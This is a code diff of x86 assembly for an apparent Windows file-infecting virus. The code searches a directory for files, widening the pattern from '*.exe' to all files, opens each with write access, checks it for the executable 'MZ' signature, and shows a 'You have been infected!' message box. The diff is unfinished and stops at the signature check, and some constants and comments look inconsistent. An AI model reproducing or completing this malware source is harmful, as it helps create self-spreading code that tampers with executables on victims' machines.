@@ -4,7 +4,7 @@ include misc.inc
 old_entry:
     invoke ExitProcess, 0
 
-.code inject
+inject SEGMENT read write execute
 	data_start EQU $
 	
 	; .data
@@ -22,52 +22,17 @@ old_entry:
     stru32dll db 'user32.dll', 0
     strMBA db 'MessageBoxA', 0
     
-    strQuery db '*.exe', 0
+    strQuery db '*', 0
 	strCaption db 'Notice', 0
     strContent db 'You have been infected!', 0
     
     ; .data?
+    tempByte db 0
+    tempWord dw 0
+    tempDword dd 0
+    tempDword2 dd 0
     filePath db 260 DUP(0) ; filePath[MAX_PATH]
     win32FindData db 320 DUP(0) ; To store WIN32_FIND_DATAA
-    
-	; .const
-	; Order of each variable IN THE STACK
-	; Position relative to r|ebp calculated by -(Order * regSz)
-    selfName EQU 11
-	selfImageBaseAddress EQU 1
-	selfSection EQU 2
-	selfEntry EQU 3
-	fileHand EQU 4 ; From FindFirstFile, for FindNextFile
-	readHand EQU 4
-	writeHand EQU 5
-	
-	tgImageBaseAddress EQU 1
-    tgOldEntry EQU 2
-    tgNewSection EQU 3
-	tgNewEntry EQU 4
-	
-    kernel32dll EQU 5
-    OrdinalTbl EQU 6
-    NamePtrTbl EQU 7
-    AddrTbl EQU 8
-    k32NumFunc EQU 9
-    user32dll EQU 10
-    
-    ffind1 EQU 12 		; FindFirstFileA
-    ffind2 EQU 13 		; FindNextFileA
-    ffind0 EQU 14 		; FindClose
-    fopen EQU 11 		; CreateFileA
-    fseek EQU 17 		; SetFilePointer(Ex)
-    fclose EQU 14 		; CloseHandle
-    fread EQU 15 		; ReadFile
-    fwrite EQU 16 		; WriteFile
-    argv0 EQU 17
-    loadlib EQU 17 		; LoadLibraryA
-    getaddr EQU 18 		; GetProcAddress
-    msgbox EQU 19 		; MessageBoxA
-    
-    stack_reserved EQU 10 ; Number of values to be stored in the stack
-    regSz EQU 4 ; 8 for 64-bit
     
     entrySectionOffset EQU $ - offset strCFA
     
@@ -168,17 +133,20 @@ start:
     
     ; Open current file for READing
     invoke fromStack(fopen),
+    		daccess(offset filePath),
     		40000000h, 		; GENERIC_READ
 	    	0, 				; No sharing
 	    	0,
 	    	4,				; OPEN_ALWAYS
 	    	80h, 			; FILE_ATTRIBUTE_NORMAL
 	    	0
+	toStack selfHand
     
     ; Find first file in directory
     push daccess(offset win32FindData)
     push daccess(offset strQuery)
     call fromStack(ffind1)
+    toStack fileHand
     
     ; Open file
     push 0
@@ -189,8 +157,15 @@ start:
 	push 40000000h OR 80000000h ; GENERIC_READ | GENERIC_WRITE
 	push daccess(offset win32FindData) + 2Ch ; cFileName in WIN32_FIND_DATAA
 	call fromStack(fopen)
-	toStack writeHand
+	toStack tgHand
 	
-	
+	; Obtain and verify magic bytes "MZ"
+	invoke fromStack(fread),
+			fromStack(tgHand), 			; Handle
+			daccess(offset tempWord),	; Pointer to output
+			2							; Length
     
+    cmp tempWord, 5a4dh
+    
+inject ENDS
 end start
